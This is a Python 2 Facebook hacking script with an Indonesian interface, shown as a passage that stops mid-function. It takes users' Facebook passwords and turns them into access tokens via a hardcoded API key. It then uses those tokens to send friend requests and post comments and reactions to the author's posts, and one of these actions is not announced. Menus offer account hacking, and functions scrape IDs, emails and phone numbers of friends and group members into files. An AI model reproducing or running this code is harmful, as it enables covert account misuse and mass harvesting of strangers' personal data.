#!/usr/bin/python2
#coding=utf-8
#Jangan Di recode bang saya juga masih pemula
#Tools update 29-09-2020
import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
P = '\033[1;97m'
M = '\033[1;91m'
H = '\033[1;92m'
K = '\033[1;93m'
B = '\033[1;94m'
U = '\033[1;95m'
O = '\033[1;96m'
my_color = [
 P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 aidha.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('reset')
done = False

def animate():
    for c in itertools.cycle(['\x1b[1;91m||', '\x1b[1;92m//', '\x1b[1;93m$$', '\x1b[1;94m--', '\x1b[1;95m$$', '\x1b[1;96m--', '\x1b[1;97m\\', '\x1b[1;91m||', '\x1b[1;92m//', '\x1b[1;93m$$', '\x1b[1;94m--', '\x1b[1;95m$$', '\x1b[1;96m--', '\x1b[1;97m\\']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;95maidha fitri\x1b[1;94m:( ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c)
        sys.stdout.flush()
        time.sleep(0.1)


t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True

def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} \x1b[1;93mSelamat Tinggal..'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0003)
	
		
##### LOGO #####
logo = """
\033[1;96m	███╗   ███╗██████╗ ███████╗
\033[1;97m	████╗ ████║██╔══██╗██╔════╝
\033[1;95m	██╔████╔██║██████╔╝█████╗  
\033[1;94m	██║╚██╔╝██║██╔══██╗██╔══╝  
\033[1;93m	██║ ╚═╝ ██║██████╔╝██║  
\033[1;92m	╚═╝     ╚═╝╚═════╝ ╚═╝   \033[1;93mVol.07
\033[1;94m────────────────────────────────────────────────
\033[1;96m  \033[1;95mAuthor   \033[1;91m: \033[1;92mAIDHA FITRI
\033[1;96m  \033[1;96mGtoup    \033[1;91m: \033[1;92mS A F I
\033[1;96m  \033[1;94Facebook  \033[1;91m: \033[1;92mRINCIANI PUTRI
\033[1;94m────────────────────────────────────────────────
\033[1;95m       {\033[1;97mSELAMAT DATANG DI SCRIPT AIDHA FITRI\033[1;95m}                     
\033[1;92m     Jangan lupa follow facebook gw
\033[1;94m────────────────────────────────────────────────"""
logo1 = """
\033[1;91m	███╗   ███╗██████╗ ███████╗
\033[1;92m	████╗ ████║██╔══██╗██╔════╝
\033[1;93m	██╔████╔██║██████╔╝█████╗  
\033[1;94m	██║╚██╔╝██║██╔══██╗██╔══╝  
\033[1;95m	██║ ╚═╝ ██║██████╔╝██║  
\033[1;96m	╚═╝     ╚═╝╚═════╝ ╚═╝   \033[1;93mVol.07
\033[1;94m────────────────────────────────────────────────
\033[1;96m  \033[1;95mAuthor   \033[1;91m: \033[1;92mAIDHA FITRI
\033[1;96m  \033[1;96mGtoup    \033[1;91m: \033[1;92mS A F I
\033[1;96m  \033[1;94Facebook  \033[1;91m: \033[1;92mRINCIANI PUTRI
\033[1;94m────────────────────────────────────────────────
\033[1;95m                    PERHATIAN\033[1;96m!
\033[1;94m       Setelah anda memasuka akun fb atau token
\033[1;93m     Akan Berkomentar otomatis di akun author
\033[1;94m────────────────────────────────────────────────""" 

# titik #
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### PILIH SAYANG #####
def sayang():
	os.system('reset')
	print logo
        print "\033[1;94m────────────────────────────────────────────────"
	print "\033[1;91m{\033[1;97m01\033[1;91m}\033[1;96m Login Akun  Facebook Baru"
	print "\033[1;91m{\033[1;97m02\033[1;91m}\033[1;96m Login Token Facebook"
	print "\033[1;91m{\033[1;97m00\033[1;91m}\033[1;91m Keluar"
	print "\033[1;94m────────────────────────────────────────────────"
	msuk = raw_input("\033[1;91m╚═\033[1;96m>>> \033[1;94m")
	if msuk =="":
		print"\033[1;91m[!] Salah pilih yang benar"
		sayang()
	elif msuk =="1":
		kontol()
	elif msuk =="2":
		tokenz()
	elif msuk =="0":
		keluar()
	else:
		print"\033[1;91m[!] Salah pilih yang benar"
		sayang()

##### KONTOL #####
#================#
def kontol():
	os.system('reset')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('reset')
		print logo1
		print('\033[1;91m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] Tidak Ada Koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin berhasil'
                                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				yayan_gantenx()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] Tidak Ada Koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;91m[!] \033[1;93mSepertinya Akun Anda Terkena Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;91m[!] Login gagal")
			os.system('rm -rf login.txt')
			time.sleep(0.01)
			sayang()
			
##### TOKEN #####
def tokenz():
	os.system('reset')
	print logo1
	toket = raw_input("\033[1;91m[?] \033[1;97mMasukan Token \033[1;91m: \033[1;94m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
	        print '\n\x1b[1;95mLogin Berhasil.•◈•.'
		aidha_fitri()
	except KeyError:
		print "\033[1;91m[!] Token Salah"
		e = raw_input("\033[1;91m[?] \033[1;96mAnda Tau token? Kalo Tidak Tau Pm saya!\033[1;91m{\033[1;96my\033[1;97m/\033[1;93mn\033[1;91m}\033[1;97m: ")
		if e =="":
			keluar()
		elif e =="y":
			sayang()
		else:
			keluar()

### AIDHA FITRI ###
def aidha_fitri():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\33[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('100005789553399')
	kom = ('Lanjutkan Ter sampai bronjol😂😂😂😘')
	reac = ('ANGRY')
	post = ('1190012567868384')
	post2 = ('1190012567868384')
	kom2 = ('Sc Nya Keren Bang Wahyu😍😍😍')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()
			
##### MENU ##########################################
def menu():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('reset')
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('reset')
		print"\033[1;91m[!] \033[1;93mAkun Anda Terkena Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[!] Tidak Ada Koneksi"
		keluar()
	os.system("reset")
	print logo
	print "\033[1;95m────────────────────────────────────────────────"
	print "\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m"
	print "\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id
	print "\033[1;95m────────────────────────────────────────────────"
	print "\033[1;93m{\033[1;95m01\033[1;93m}\033[1;97m Informasi pengguna  "
	print "\033[1;93m{\033[1;95m02\033[1;93m}\033[1;97m Dapatkan Id/email/hp"
	print "\033[1;93m{\033[1;95m03\033[1;93m}\033[1;97m Hack Akun Facebok   "
	print "\033[1;93m{\033[1;95m04\033[1;93m}\033[1;97m Bot komen & auto like"
	print "\033[1;93m{\033[1;95m05\033[1;93m}\033[1;97m Lainnya             "
	print "\033[1;93m{\033[1;95m06\033[1;93m}\033[1;97m Cek Token Anda      "
        print "\033[1;93m{\033[1;95m07\033[1;93m}\033[1;97m Update tools        "
	print "\033[1;93m{\033[1;95m08\033[1;93m}\033[1;97m Hapus sampah        "
	print "\033[1;93m{\033[1;95m09\033[1;93m}\033[1;97m Bonus               "
	print "\033[1;93m{\033[1;95m00\033[1;93m}\033[1;97m Keluar              "
	print "\033[1;94m────────────────────────────────────────────────"
	pilih()
#-
def pilih():
	zedd = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if zedd =="":
		print "\033[1;91m[!] Salah pilih yang benar"
		pilih()
	elif zedd =="1":
		informasi()
	elif zedd =="2":
		dump()
	elif zedd =="3":
		menu_hack()
	elif zedd =="4":
		menu_bot()
	elif zedd =="5":
		lain()
	elif zedd =="6":
		os.system('reset')
		print logo
		toket=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;92mtoken anda \033[1;91m : \033[1;97m "+toket
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		menu()
        elif zedd =="7":
                os.system('reset')
                print logo
                print 40 * '\033[1;97m\xe2\x95\x90'
                os.system('git pull origin master')
                raw_input('\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]')
                menu()
	elif zedd =="8":
		os.remove('out')
	elif zedd =="9":
		os.system('rm -rf login.txt')
		os.system('xdg-open https://www.facebook.com/khairul.fatihin557')
		keluar()
	elif zedd =="0":
		sayang()
	else:
		print "\033[1;91m[!] Salah pilih yang benar"
		pilih()
	
##### INFO #####
def informasi():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	aid = raw_input('\033[1;91m[+] \033[1;92mMasukan ID \033[1;97m/\033[1;92mNama \033[1;91m: \033[1;97m')
	jalan('\033[1;91m[✺] \033[1;92mLoading \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			print 42*"\033[1;97m═"
			try:
				print '\033[1;91m[➹] \033[1;92mNama\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mNama\033[1;97m          : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mTelephone\033[1;97m     : '+z['mobile_phone']
			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mLokasi\033[1;97m      : '+z['location']['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mLokasi\033[1;97m      : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mTanggal lahir\033[1;97m : '+z['birthday']
			except KeyError: print '\033[1;91m[?] \033[1;92mTanggal lahir\033[1;97m : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mSekolah\033[1;97m        : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
			except KeyError: pass
			raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
			menu()
		else:
			pass
	else:
		print"\033[1;91m[✖] Id Tidak Ada"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		menu()
		
##### DUMP #####
def dump():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;94m────────────────────────────────────────────────"
	print "\033[1;93m{\033[1;95m01\033[1;93m}\033[1;92m Dapatkan ID dari teman"
	print "\033[1;93m{\033[1;95m02\033[1;93m}\033[1;92m Dapatkan ID teman dari teman"
	print "\033[1;93m{\033[1;95m03\033[1;93m}\033[1;92m Dapatkan ID dari member group"
	print "\033[1;93m{\033[1;95m04\033[1;93m}\033[1;92m Dapatkan email member group"
	print "\033[1;93m{\033[1;95m05\033[1;93m}\033[1;92m Dapatkan nomor dari member group"
	print "\033[1;93m{\033[1;95m06\033[1;93m}\033[1;92m Dapatkan email teman"
	print "\033[1;93m{\033[1;95m07\033[1;93m}\033[1;92m Dapatkan email teman dari teman"
	print "\033[1;93m{\033[1;95m08\033[1;93m}\033[1;92m Dapatkan teman nomor phone teman"
	print "\033[1;93m{\033[1;95m09\033[1;93m}\033[1;92m Dapatkan teman nomor phone teman dari teman"
	print "\033[1;93m{\033[1;95m00\033[1;93m}\033[1;91m Keluar"
	print "\033[1;94m────────────────────────────────────────────────"
	dump_pilih()
#-----pilih
def dump_pilih():
	cuih = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if cuih =="":
		print "\033[1;91m[!] Salah pilih yang benar"
		dump_pilih()
	elif cuih =="1":
		id_teman()
	elif cuih =="2":
		idfrom_teman()
	elif cuih =="3":
		id_member_grup()
	elif cuih =="4":
		em_member_grup()
	elif cuih =="5":
		no_member_grup()
	elif cuih =="6":
		email()
	elif cuih =="7":
		emailfrom_teman()
	elif cuih =="8":
		nomor_hp()
	elif cuih =="9":
		hpfrom_teman()
	elif cuih =="0":
		menu()
	else:
		print "\033[1;91m[!] Salah pilih yang benar"
		dump_pilih()
		
##### ID TEMAN #####
def id_teman():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mDapatkan semua id teman \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/id_teman.txt','w')
		for a in z['data']:
			idteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSelesa mendapkan id\033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSimpan file diluar folder nama\033[1;91m :\033[1;97m ")
		os.rename('out/id_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile save \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBmKeluar \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Terjadi kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mkeluar \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()

##### ID FROM TEMAN #####
def idfrom_teman():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mMasukan ID teman \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Teman tidak ada"
			raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mDapatkan semua ID teman dari teman \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/id_teman_from_teman.txt','w')
		for a in z['friends']['data']:
			idfromteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSelesai memdaptkan ID \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file di luar folder nama\033[1;91m :\033[1;97m ")
		os.rename('out/id_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile save \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Terjadi kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()

##### ID FROM MEMBER GRUP #####
def id_member_grup():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mMasukan ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group tidak ada"
			raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
			dump()
		jalan('\033[1;91m[✺] \033[1;97mMendaptan ID member group\033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999999&access_token='+toket)
		s=json.loads(re.text)
		for a in s['data']:
			idmem.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSelesai mendaptkan ID \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idmem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file di luar folder nama\033[1;91m :\033[1;97m ")
		os.rename('out/member_grup.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile save \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Terjadi kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()
		
##### EMAIL FROM GRUP #####
def em_member_grup():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mMasukan ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group tidak ada"
			raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
			dump()
		jalan('\033[1;91m[✺] \033[1;92mMendapatkan email member group \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/em_member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for a in s['data']:
			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emmem.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(emmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email from member group \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emmem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file di luar folder nama\033[1;91m :\033[1;97m ")
		os.rename('out/em_member_grup.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile save \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Terjadi kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()
		
##### NOMER FROM GRUP #####
def no_member_grup():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mMasukan ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mNama group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group tidak ada"
			raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
			dump()
		jalan('\033[1;91m[✺] \033[1;92mMendapatkan nomor phone member group \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/no_member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for a in s['data']:
			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				nomem.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(nomem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSelesai mendapatkan nomor phone member group \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(nomem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file diluar folder nama\033[1;91m :\033[1;97m ")
		os.rename('out/no_member_grup.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Terjadi kesalahan saat membuat file"
		raw_input("\n\033[1;91m[ \033[1;97mkeluar \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()
		
##### EMAIL #####
def email():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mMendapatkan semua email teman \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/email_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				em.append(z['email'])
				bz.write(z['email'] + '\n')
